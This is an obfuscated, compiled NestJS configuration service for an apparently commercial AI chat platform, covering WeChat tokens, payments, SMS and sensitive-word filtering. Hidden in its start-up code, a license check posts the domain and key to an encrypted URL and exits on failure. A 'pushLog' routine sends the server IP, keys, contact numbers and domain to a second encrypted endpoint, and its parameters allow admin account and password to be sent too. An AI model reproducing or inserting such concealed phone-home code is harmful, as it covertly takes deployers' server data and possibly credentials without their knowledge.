'use strict';const _0x1af87a=_0x1fc5;function _0x1fc5(_0x497aef,_0x4a82fb){const _0x67d9e3=_0x67d9();return _0x1fc5=function(_0x1fc51b,_0x903f3b){_0x1fc51b=_0x1fc51b-0xf1;let _0x35f113=_0x67d9e3[_0x1fc51b];return _0x35f113;},_0x1fc5(_0x497aef,_0x4a82fb);}(function(_0xa64271,_0x5aaeb1){const _0x3b90b1=_0x1fc5,_0x1187b7=_0xa64271();while(!![]){try{const _0x4d3d9b=-parseInt(_0x3b90b1(0x11b))/0x1*(parseInt(_0x3b90b1(0x144))/0x2)+-parseInt(_0x3b90b1(0x100))/0x3+-parseInt(_0x3b90b1(0x126))/0x4*(-parseInt(_0x3b90b1(0x13a))/0x5)+-parseInt(_0x3b90b1(0x156))/0x6+-parseInt(_0x3b90b1(0x196))/0x7+parseInt(_0x3b90b1(0x121))/0x8*(parseInt(_0x3b90b1(0x182))/0x9)+parseInt(_0x3b90b1(0x194))/0xa*(parseInt(_0x3b90b1(0x110))/0xb);if(_0x4d3d9b===_0x5aaeb1)break;else _0x1187b7['push'](_0x1187b7['shift']());}catch(_0x40d455){_0x1187b7['push'](_0x1187b7['shift']());}}}(_0x67d9,0x7f4bd));function _0x67d9(){const _0xdc2473=['data:image/jpeg;base64,','signInRewards','baiduTextSecretKey','JPFq8fAlQE2V2Eq7KWYSxg==','194930dpdcyc','stringify','4755632FcqpuS','configEntity','getWechatAccessToken','queryPayType','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','&client_secret=','nestjs-cls','has','获取微信access_token失败、错误信息：','findOne','refresh','errmsg','global','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','https://aip.baidubce.com/oauth/2.0/token?client_id=','warn','ticket','2220735jJuRTX','../../config/AppConfig','access_token','getConfigByKeys','configKey','cls','PPTConfig','getConfigs4Front','签到功能暂未开放!','get','https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official','wechatAccessTokenMap','mpay','Logger','decrypt','kaifa.qumao518.vip','1122ZHRsAj','forEach','message','ceshi.qumao518.vip','relateId','error','POST','baiduTextAccessToken','9kxwFUQptTaelrKStrwZQQ==','hupi','wechatOfficialAppId','2479Hddhet','MjConfig','./config.entity','__esModule','defineProperty','GOMAXAI','96KEMHGv','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','getSignatureGiftConfig','__param','update','12NLTCMx','signInStatus','PORT','aliPhoneAccessKeyId','ISDEV','length','configVal','siteName','then','qqNumber','payMpayStatus','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','./constant','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','every','../../common/utils','set','getSensitiveConfig','../../common/store','aliPhoneAccessKeySecret','1663530GSALJa','vipLeavelRelEntity','__decorate','wechatJsapiTicketMap','decorate','fetchBaseAccessToken','payHupiStatus','ConfigEntity','metadata','toString','754xDynjk','vxNumber','\x20微信配置缺失，不可使用微信登录！','LinkFoxConfig','./vip_leavel_rel.entity','payEpayStatus','catch','&grant_type=client_credentials','saas\x20','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','concat','baiduTextStatus','APP_VERSION','nineaiBuiltInSensitiveStatus','phoneRegisterStatus','baiduTextAccessToken-0','UNAUTHORIZED','getVipLeavelRelById','808554lxifex','SAAS','ClsService','CZConfig','SelfKeys','axios','domain','post','NAMESPACE','data','BAD_REQUEST','支付功能暂未开放!','code','百度敏感词配置检测失败，您的参数可能配置的不正确!','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','application/json','设置配置信息错误！','saasId','@nestjs/cli/actions','MusicConfig','object','check','save','createOrUpdate','GlobalConfigService','response','default','log','TRUE','initBaiduSensitive','WechatConfig','robotAvatar','HttpException','function','onModuleInit','json','nineai','setConfig','GOMAXAI_HOST','wechat','registerBaseUrl','aliPhoneSignName','payWechatStatus','keys','17973llEgYy','VipLeavelRelEntity','baiduTextApiKey','InjectRepository','@nestjs/common','epay','env','nineaiBuiltInSensitiveApiBase','queryFrontConfig','HttpStatus','wechatOfficialAppSecret','pushLog','exit','includes'];_0x67d9=function(){return _0xdc2473;};return _0x67d9();}var __decorate=this&&this[_0x1af87a(0x13c)]||function(_0x6a286e,_0x56d00d,_0x1eefa9,_0xa9957a){const _0x365d61=_0x1af87a;var _0x1a638d=arguments['length'],_0x4dffa8=_0x1a638d<0x3?_0x56d00d:_0xa9957a===null?_0xa9957a=Object['getOwnPropertyDescriptor'](_0x56d00d,_0x1eefa9):_0xa9957a,_0x261530;if(typeof Reflect==='object'&&typeof Reflect[_0x365d61(0x13e)]===_0x365d61(0x177))_0x4dffa8=Reflect[_0x365d61(0x13e)](_0x6a286e,_0x56d00d,_0x1eefa9,_0xa9957a);else{for(var _0x448cec=_0x6a286e['length']-0x1;_0x448cec>=0x0;_0x448cec--)if(_0x261530=_0x6a286e[_0x448cec])_0x4dffa8=(_0x1a638d<0x3?_0x261530(_0x4dffa8):_0x1a638d>0x3?_0x261530(_0x56d00d,_0x1eefa9,_0x4dffa8):_0x261530(_0x56d00d,_0x1eefa9))||_0x4dffa8;}return _0x1a638d>0x3&&_0x4dffa8&&Object[_0x365d61(0x11f)](_0x56d00d,_0x1eefa9,_0x4dffa8),_0x4dffa8;},__metadata=this&&this['__metadata']||function(_0x2a240d,_0x24d24d){const _0x2220f8=_0x1af87a;if(typeof Reflect===_0x2220f8(0x16a)&&typeof Reflect[_0x2220f8(0x142)]==='function')return Reflect['metadata'](_0x2a240d,_0x24d24d);},__param=this&&this[_0x1af87a(0x124)]||function(_0x58a2f7,_0x21db50){return function(_0x82684b,_0x1bc486){_0x21db50(_0x82684b,_0x1bc486,_0x58a2f7);};};Object[_0x1af87a(0x11f)](exports,_0x1af87a(0x11e),{'value':!![]}),exports[_0x1af87a(0x16e)]=void 0x0;const common_1=require(_0x1af87a(0x186)),config_entity_1=require(_0x1af87a(0x11d)),typeorm_1=require('@nestjs/typeorm'),typeorm_2=require('typeorm'),utils_1=require(_0x1af87a(0x135)),axios_1=require(_0x1af87a(0x15b)),actions_1=require(_0x1af87a(0x168)),store_1=require(_0x1af87a(0x138)),store_2=require(_0x1af87a(0x138)),AppConfig_1=require(_0x1af87a(0x101)),vip_leavel_rel_entity_1=require(_0x1af87a(0x148)),nestjs_cls_1=require(_0x1af87a(0xf5)),constant_1=require(_0x1af87a(0x132)),authCheckUrl=(0x0,utils_1[_0x1af87a(0x10e)])(_0x1af87a(0x122)),authLogUrl=(0x0,utils_1[_0x1af87a(0x10e)])(_0x1af87a(0x131));let GlobalConfigService=class GlobalConfigService{constructor(_0x1b99be,_0x51bc5d,_0x50261d){const _0x193dac=_0x1af87a;this[_0x193dac(0x197)]=_0x1b99be,this[_0x193dac(0x13b)]=_0x51bc5d,this[_0x193dac(0x105)]=_0x50261d,this[_0x193dac(0x10b)]=new Map(),this[_0x193dac(0x13d)]=new Map();}async[_0x1af87a(0x178)](){const _0x442c59=_0x1af87a;await this['checkAiAuth'](),await this['pushLog'](),await this['initBaiduSensitive'](),await this[_0x442c59(0xf1)](!![]);const _0x16d657=[][_0x442c59(0x14e)](store_1[_0x442c59(0x11c)][_0x442c59(0x181)],store_1[_0x442c59(0x159)][_0x442c59(0x181)],store_2[_0x442c59(0x174)][_0x442c59(0x181)],store_1[_0x442c59(0x147)][_0x442c59(0x181)],store_1[_0x442c59(0x106)][_0x442c59(0x181)],store_1[_0x442c59(0x169)][_0x442c59(0x181)]),_0x4b804d=await this['getConfigByKeys'](_0x16d657);store_1[_0x442c59(0x11c)][_0x442c59(0xf9)](_0x4b804d),store_1['CZConfig'][_0x442c59(0xf9)](_0x4b804d),store_2[_0x442c59(0x174)]['refresh'](_0x4b804d),store_1[_0x442c59(0x147)]['refresh'](_0x4b804d),store_1[_0x442c59(0x169)]['refresh'](_0x4b804d),store_1[_0x442c59(0x106)][_0x442c59(0xf9)](_0x4b804d);}async['checkAiAuth'](){const _0x4686f1=_0x1af87a;if(process[_0x4686f1(0x188)]['ENV']==='development')return;const _0x4b6ec5=process['env'][(0x0,utils_1[_0x4686f1(0x10e)])(_0x4686f1(0x193))],_0xeb4c81=process[_0x4686f1(0x188)][(0x0,utils_1[_0x4686f1(0x10e)])(_0x4686f1(0x118))];(!_0xeb4c81||!_0x4b6ec5)&&(common_1['Logger'][_0x4686f1(0x115)]((0x0,utils_1['decrypt'])(_0x4686f1(0xfc))),(0x0,actions_1[_0x4686f1(0x18e)])());const _0x3786af={'authDomain':_0x4b6ec5,'authKey':_0xeb4c81},_0x218f86={'method':_0x4686f1(0x116),'headers':{'Content-Type':_0x4686f1(0x165)},'body':JSON[_0x4686f1(0x195)](_0x3786af)},_0x1d78bc=await fetch(authCheckUrl,_0x218f86)[_0x4686f1(0x12e)](_0x19a823=>{const _0x28d332=_0x4686f1;return _0x19a823[_0x28d332(0x179)]();})['catch'](_0x3a309e=>{const _0x418df8=_0x4686f1;common_1['Logger'][_0x418df8(0x115)](_0x3a309e,_0x418df8(0xfb));});_0x1d78bc[_0x4686f1(0x162)]!==0x0&&(common_1[_0x4686f1(0x10d)][_0x4686f1(0x115)]((0x0,utils_1[_0x4686f1(0x10e)])(_0x4686f1(0x133))),(0x0,actions_1['exit'])()),_0x1d78bc?.[_0x4686f1(0x162)]===0x0&&!_0x1d78bc?.[_0x4686f1(0x15f)]?.[_0x4686f1(0x16b)]&&(common_1[_0x4686f1(0x10d)][_0x4686f1(0x115)]((0x0,utils_1['decrypt'])(_0x4686f1(0xfc))),(0x0,actions_1['exit'])());}async['pushLog'](_0x4d2d90,_0x361a7e){const _0x253048=_0x1af87a,_0x3be88f=process[_0x253048(0x188)][(0x0,utils_1[_0x253048(0x10e)])('JPFq8fAlQE2V2Eq7KWYSxg==')],_0x219ef4=process[_0x253048(0x188)][(0x0,utils_1[_0x253048(0x10e)])(_0x253048(0x118))],_0x393b25=process[_0x253048(0x188)][_0x253048(0x128)];if(!_0x3be88f||!_0x219ef4)throw new common_1['HttpException']((0x0,utils_1[_0x253048(0x10e)])(_0x253048(0xfc)),common_1[_0x253048(0x18b)][_0x253048(0x154)]);const {qqNumber:_0x2ec764,vxNumber:_0x56bed1,siteName:_0x4a946f,domain:_0x24582f,registerBaseUrl:_0x26a797}=await this[_0x253048(0x103)]([_0x253048(0x12f),_0x253048(0x145),_0x253048(0x12d),_0x253048(0x15c),_0x253048(0x17e)]),_0x428021={'ip':_0x3be88f,'key':_0x219ef4,'port':_0x393b25,'qqNumber':_0x2ec764,'vxNumber':_0x56bed1,'domain':_0x24582f,'adminAccount':_0x4d2d90,'adminPass':_0x361a7e,'baseUrl':_0x26a797,'siteName':_0x4a946f,'qq':_0x2ec764,'vxNum':_0x56bed1,'version':AppConfig_1[_0x253048(0x150)]},_0x459ade={'method':_0x253048(0x116),'headers':{'Content-Type':_0x253048(0x165)},'body':JSON[_0x253048(0x195)](_0x428021)};await fetch(authLogUrl,_0x459ade)[_0x253048(0x14a)](_0x59ce7a=>{const _0x9b1c67=_0x253048;console[_0x9b1c67(0x171)]('push\x20log\x20error',_0x59ce7a);});}async[_0x1af87a(0x173)](_0x1df930=!![]){const _0xb66df4=_0x1af87a,{baiduTextApiKey:_0x123efb,baiduTextSecretKey:_0x3cdc71}=await this[_0xb66df4(0x103)]([_0xb66df4(0x184),_0xb66df4(0x192)]);if(!_0x123efb||!_0x3cdc71){common_1[_0xb66df4(0x10d)][_0xb66df4(0x115)](_0xb66df4(0x14d),_0xb66df4(0x16e));return;}const _0x338745={'Content-Type':_0xb66df4(0x165),'Accept':_0xb66df4(0x165)},_0xe91281=_0xb66df4(0xfd)+_0x123efb+_0xb66df4(0xf4)+_0x3cdc71+_0xb66df4(0x14b);try{const _0xf5cbf4=await axios_1[_0xb66df4(0x170)][_0xb66df4(0x15d)](_0xe91281,{'headers':_0x338745});this[_0xb66df4(0x117)]=_0xf5cbf4[_0xb66df4(0x15f)][_0xb66df4(0x102)];}catch(_0x5e5d8a){if(_0x1df930)common_1[_0xb66df4(0x10d)][_0xb66df4(0x115)](_0xb66df4(0x163),'GlobalConfigService');else throw new common_1[(_0xb66df4(0x176))](_0x5e5d8a[_0xb66df4(0x16f)]['data']['error_description'],common_1[_0xb66df4(0x18b)][_0xb66df4(0x160)]);}}async[_0x1af87a(0xf1)](_0x759001=![]){const _0x534a1a=_0x1af87a,_0x21f0ec=new Map(),_0x25a0e0=await this[_0x534a1a(0x197)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])([_0x534a1a(0x11a),_0x534a1a(0x18c)])}});_0x25a0e0[_0x534a1a(0x111)](_0x2d62f8=>{const _0x18fcd3=_0x534a1a;!_0x21f0ec['has'](_0x2d62f8[_0x18fcd3(0x167)])&&_0x21f0ec[_0x18fcd3(0x136)](_0x2d62f8['saasId'],{}),_0x21f0ec[_0x18fcd3(0x109)](_0x2d62f8['saasId'])[_0x2d62f8[_0x18fcd3(0x104)]]=_0x2d62f8['configVal'];}),_0x21f0ec[_0x534a1a(0x111)]((_0x1da906,_0x13cb26)=>{const _0x3f29b0=_0x534a1a;!_0x1da906[_0x3f29b0(0x11a)]||!_0x1da906[_0x3f29b0(0x18c)]?common_1['Logger'][_0x3f29b0(0xfe)](_0x3f29b0(0x14c)+_0x13cb26+_0x3f29b0(0x146),'getWechatAccessToken'):this[_0x3f29b0(0x13f)](_0x13cb26,_0x1da906['wechatOfficialAppId'],_0x1da906['wechatOfficialAppSecret'],_0x759001);}),common_1['Logger'][_0x534a1a(0x171)]('wechat\x20get\x20access_token\x20done','OfficialService');}async[_0x1af87a(0x13f)](_0x2c9332,_0x411456,_0x40ba5b,_0x22b4cd=![]){const _0x59df8e=_0x1af87a;if(process[_0x59df8e(0x188)][_0x59df8e(0x12a)]===_0x59df8e(0x172))return;try{let _0x40fc9c='';const _0xc3ff4=process[_0x59df8e(0x188)][_0x59df8e(0x17c)];if(_0xc3ff4===_0x59df8e(0x10f)||_0xc3ff4===_0x59df8e(0x113)||_0xc3ff4==='saas.qumao518.vip'){const _0x2b2cd3=await axios_1['default'][_0x59df8e(0x109)](_0x59df8e(0x10a));_0x40fc9c=_0x2b2cd3[_0x59df8e(0x15f)]['data'];}else{const _0x526809=await axios_1[_0x59df8e(0x170)]['get'](_0x59df8e(0x164)+_0x411456+'&secret='+_0x40ba5b);if(_0x526809[_0x59df8e(0x15f)]['errmsg'])throw new Error(_0x59df8e(0xf7)+_0x526809[_0x59df8e(0x15f)][_0x59df8e(0xfa)]);_0x40fc9c=_0x526809[_0x59df8e(0x15f)][_0x59df8e(0x102)];}this[_0x59df8e(0x10b)]['set'](_0x2c9332,_0x40fc9c);const _0x316c30=await axios_1[_0x59df8e(0x170)][_0x59df8e(0x109)](_0x59df8e(0xf3)+_0x40fc9c+'&type=jsapi');this[_0x59df8e(0x13d)][_0x59df8e(0x136)](_0x2c9332,_0x316c30?.[_0x59df8e(0x15f)]?.[_0x59df8e(0xff)]);}catch(_0x3ad17d){common_1[_0x59df8e(0x10d)][_0x59df8e(0x115)](_0x3ad17d[_0x59df8e(0x112)],'fetchBaseAccessToken');}}async['checkDomain'](_0x3d0c60){const _0x22f47d=_0x1af87a;if(process['env'][_0x22f47d(0x157)])return!![];const {domain:_0x42ef4d}=_0x3d0c60,_0x44e2a0=process[_0x22f47d(0x188)][(0x0,utils_1[_0x22f47d(0x10e)])(_0x22f47d(0x193))];return _0x42ef4d['includes'](_0x44e2a0);}async[_0x1af87a(0x16d)](_0x512a8d){const _0x116e3f=_0x1af87a;try{const _0x50f6ef=this[_0x116e3f(0x105)][_0x116e3f(0x109)](_0x116e3f(0x167)),{configKey:_0x1b5145,configVal:_0x59e0d2,status:status=0x1}=_0x512a8d,_0x41d94e=await this[_0x116e3f(0x197)][_0x116e3f(0xf8)]({'where':{'configKey':_0x1b5145,'saasId':_0x50f6ef}});typeof _0x59e0d2==='object'?_0x41d94e?await this[_0x116e3f(0x197)][_0x116e3f(0x125)]({'configKey':_0x1b5145,'saasId':_0x50f6ef},{'configJsonVal':_0x59e0d2,'status':status}):await this[_0x116e3f(0x197)]['save']({'configKey':_0x1b5145,'configJsonVal':_0x59e0d2,'status':status,'saasId':_0x50f6ef}):_0x41d94e?await this[_0x116e3f(0x197)]['update']({'configKey':_0x1b5145,'saasId':_0x50f6ef},{'configVal':_0x59e0d2,'status':status}):await this[_0x116e3f(0x197)][_0x116e3f(0x16c)]({'configKey':_0x1b5145,'configVal':_0x59e0d2,'status':status,'saasId':_0x50f6ef});}catch(_0x15f653){throw new common_1[(_0x116e3f(0x176))](_0x116e3f(0x166),common_1[_0x116e3f(0x18b)]['BAD_REQUEST']);}}async[_0x1af87a(0x17b)](_0x51d07f){const _0xd29d21=_0x1af87a;let _0x47f6f6=![],_0x1f1b89=![],_0x74c9ce=![],_0x27bd64=![],_0x692fbd=![],_0x109363=![],_0xf78fc6=![];const _0x322590={},{settings:_0x203342}=_0x51d07f;for(const _0x4f08d8 of _0x203342){await this[_0xd29d21(0x16d)](_0x4f08d8),_0x322590[_0x4f08d8[_0xd29d21(0x104)]]=_0x4f08d8[_0xd29d21(0x12c)],store_1[_0xd29d21(0x11c)][_0x4f08d8[_0xd29d21(0x104)]]&&(_0x47f6f6=!![]),store_1[_0xd29d21(0x159)][_0x4f08d8['configKey']]&&(_0x1f1b89=!![]),store_2['WechatConfig'][_0x4f08d8[_0xd29d21(0x104)]]&&(_0x74c9ce=!![]),store_1[_0xd29d21(0x147)][_0x4f08d8[_0xd29d21(0x104)]]&&(_0xf78fc6=!![]),[_0xd29d21(0x184),_0xd29d21(0x192)][_0xd29d21(0x18f)](_0x4f08d8[_0xd29d21(0x104)])&&(_0x27bd64=!![]),['wechatOfficialAppId',_0xd29d21(0x18c)][_0xd29d21(0x18f)](_0x4f08d8['configKey'])&&(_0x692fbd=!![]),[_0xd29d21(0x12f),_0xd29d21(0x145),'siteName','domain',_0xd29d21(0x17e)]['includes'](_0x4f08d8['configKey'])&&(_0x109363=!![]);}return _0x47f6f6&&store_1[_0xd29d21(0x11c)][_0xd29d21(0xf9)](_0x322590),_0x1f1b89&&store_1[_0xd29d21(0x159)]['refresh'](_0x322590),_0x74c9ce&&store_2['WechatConfig'][_0xd29d21(0xf9)](_0x322590),_0xf78fc6&&store_1[_0xd29d21(0x147)][_0xd29d21(0xf9)](_0x322590),_0x27bd64&&await this[_0xd29d21(0x173)](![]),_0x692fbd&&await this['getWechatAccessToken'](),_0x109363&&this[_0xd29d21(0x18d)](),'设置完成！';}async[_0x1af87a(0x107)](_0x210c80){const _0x48e51d=_0x1af87a,_0x3c88db=await this[_0x48e51d(0x103)](_0x210c80,!![]);return _0x210c80['length']===0x1?_0x3c88db[_0x210c80[0x0]]:_0x3c88db;}async[_0x1af87a(0x103)](_0x56cd24,_0x19e9b4=![]){const _0x425634=_0x1af87a;if(!_0x56cd24[_0x425634(0x12b)])throw new Error('查询配置不能为空！');const _0x2fdde6=this['cls'][_0x425634(0x109)]('saasId')||0x0,_0xc74695=new Map(),_0x54a36e=await this[_0x425634(0x197)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x56cd24),'saasId':(0x0,typeorm_2['In'])([0x0,_0x2fdde6])}});_0x54a36e[_0x425634(0x111)](_0x33017d=>{const _0x31acda=_0x425634,{configKey:_0x705d01,configVal:_0x6961c8,configJsonVal:_0x281680,saasId:_0x3ad48e}=_0x33017d;_0xc74695[_0x31acda(0x136)](_0x705d01+'-'+_0x3ad48e,_0x281680||_0x6961c8);}),this[_0x425634(0x10b)][_0x425634(0x111)]((_0x12b558,_0x5e4512)=>{const _0x34eaed=_0x425634;_0xc74695[_0x34eaed(0x136)]('wechatAccessToken-'+_0x5e4512,_0x12b558);}),this['wechatJsapiTicketMap'][_0x425634(0x111)]((_0x7747a8,_0x4878a3)=>{const _0x5a9589=_0x425634;_0xc74695[_0x5a9589(0x136)]('wechatJsapiTicket-'+_0x4878a3,_0x7747a8);}),_0xc74695[_0x425634(0x136)](_0x425634(0x153),this[_0x425634(0x117)]);const _0x3818ff={};_0x56cd24['forEach'](_0x264171=>{const _0x5dde41=_0x425634;let _0x886a2a=_0x264171+'-'+_0x2fdde6,_0x244061='';_0xc74695[_0x5dde41(0xf6)](_0x886a2a)?_0x244061=_0xc74695[_0x5dde41(0x109)](_0x886a2a):!constant_1[_0x5dde41(0x15a)][_0x5dde41(0x18f)](_0x264171)&&(_0x244061=_0xc74695[_0x5dde41(0x109)](_0x264171+'-'+0x0)),_0x3818ff[_0x264171]=_0x244061;});if(_0x19e9b4)return _0x3818ff;return _0x56cd24[_0x425634(0x12b)]===0x1?_0x3818ff[_0x56cd24[0x0]]:_0x3818ff;}async[_0x1af87a(0x18a)](){const _0x10a30b=_0x1af87a,_0x2d3502=await this[_0x10a30b(0x103)](constant_1['FrontKeys']);return{..._0x2d3502,'isUseWxLogin':!!(_0x2d3502[_0x10a30b(0x11a)]&&_0x2d3502[_0x10a30b(0x18c)])};}async[_0x1af87a(0xf2)](_0x3e8571=_0x1af87a(0x17d)){const _0x3c6188=_0x1af87a,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x3c6188(0x103)]([_0x3c6188(0x140),_0x3c6188(0x149),_0x3c6188(0x130),_0x3c6188(0x180)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x3c6188(0x134)](_0x5b3ea6=>_0x5b3ea6===0x0))throw new common_1['HttpException'](_0x3c6188(0x161),common_1[_0x3c6188(0x18b)][_0x3c6188(0x160)]);if(Number(payWechatStatus)===0x1)return _0x3e8571;if(Number(payEpayStatus)===0x1)return _0x3c6188(0x187);if(Number(payMpayStatus)===0x1)return _0x3c6188(0x10c);if(Number(payHupiStatus)===0x1)return _0x3c6188(0x119);}async['getPhoneVerifyConfig'](){const _0xbc3676=_0x1af87a,{phoneRegisterStatus:_0x5ed434,aliPhoneAccessKeyId:_0x475341,aliPhoneAccessKeySecret:_0x2cf69b,aliPhoneSignName:_0x40edcf,aliPhoneTemplateCode:_0x1eaaea}=await this[_0xbc3676(0x103)]([_0xbc3676(0x152),_0xbc3676(0x129),_0xbc3676(0x139),_0xbc3676(0x17f),'aliPhoneTemplateCode']);if(Number(_0x5ed434)!==0x1)throw new common_1[(_0xbc3676(0x176))]('手机验证码功能暂未开放!',common_1[_0xbc3676(0x18b)][_0xbc3676(0x160)]);return{'accessKeyId':_0x475341,'accessKeySecret':_0x2cf69b,'SignName':_0x40edcf,'TemplateCode':_0x1eaaea};}['getNamespace'](){const _0x262877=_0x1af87a;return process[_0x262877(0x188)][_0x262877(0x15e)]||_0x262877(0x120);}async[_0x1af87a(0x123)](){const _0x566ed4=_0x1af87a,_0x3fc19b=await this[_0x566ed4(0x103)]([_0x566ed4(0x127),'signInRewards']),_0x32e84b={};for(let _0x2a251a in _0x3fc19b){const _0x752892=Number(_0x3fc19b[_0x2a251a]);_0x32e84b[_0x2a251a]=isNaN(_0x752892)?0x0:_0x752892;}if(!_0x32e84b[_0x566ed4(0x127)])throw new common_1[(_0x566ed4(0x176))](_0x566ed4(0x108),common_1['HttpStatus'][_0x566ed4(0x160)]);return _0x32e84b[_0x566ed4(0x191)];}async[_0x1af87a(0x137)](){const _0x329e8b=_0x1af87a,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x3b0769,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x1367aa,nineaiBuiltInSensitiveAuthKey:_0xe3263c}=await this[_0x329e8b(0x103)]([_0x329e8b(0x14f),'baiduTextAccessToken',_0x329e8b(0x151),_0x329e8b(0x189),'nineaiBuiltInSensitiveAuthKey']);if(Number(baiduTextStatus)===0x1)return{'useType':'baidu','baiduTextAccessToken':_0x3b0769};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x329e8b(0x17a),'nineaiBuiltInSensitiveApiBase':_0x1367aa,'nineaiBuiltInSensitiveAuthKey':_0xe3263c};return null;}async['robotAvatar2Base64'](){const _0x2e8e11=_0x1af87a,_0x450280=await this[_0x2e8e11(0x103)]([_0x2e8e11(0x175)]);if(!_0x450280)throw new common_1['HttpException']('未配置\x20robotAvatar.',common_1[_0x2e8e11(0x18b)]['BAD_GATEWAY']);const _0x9f1de3=await axios_1[_0x2e8e11(0x170)][_0x2e8e11(0x109)](_0x450280,{'responseType':'arraybuffer'}),_0x42f879=Buffer['from'](_0x9f1de3[_0x2e8e11(0x15f)])[_0x2e8e11(0x143)]('base64');return _0x2e8e11(0x190)+_0x42f879;}async['saveVipLeavelRel'](_0xe6bb71){const _0x3f43cd=_0x1af87a;await this[_0x3f43cd(0x13b)][_0x3f43cd(0x16c)](_0xe6bb71);}async[_0x1af87a(0x155)](_0x2245c0,_0x1f4605,_0x4fdff5){const _0x46658c=_0x1af87a,_0x51524b={'vipLeavelId':_0x2245c0,'relateType':_0x1f4605};_0x4fdff5&&(_0x51524b[_0x46658c(0x114)]=_0x4fdff5);const _0x56337f=await this['vipLeavelRelEntity'][_0x46658c(0xf8)]({'where':_0x51524b});return _0x56337f;}};GlobalConfigService=__decorate([(0x0,common_1['Injectable'])(),__param(0x0,(0x0,typeorm_1[_0x1af87a(0x185)])(config_entity_1[_0x1af87a(0x141)])),__param(0x1,(0x0,typeorm_1[_0x1af87a(0x185)])(vip_leavel_rel_entity_1[_0x1af87a(0x183)])),__metadata('design:paramtypes',[typeorm_2['Repository'],typeorm_2['Repository'],nestjs_cls_1[_0x1af87a(0x158)]])],GlobalConfigService),exports[_0x1af87a(0x16e)]=GlobalConfigService;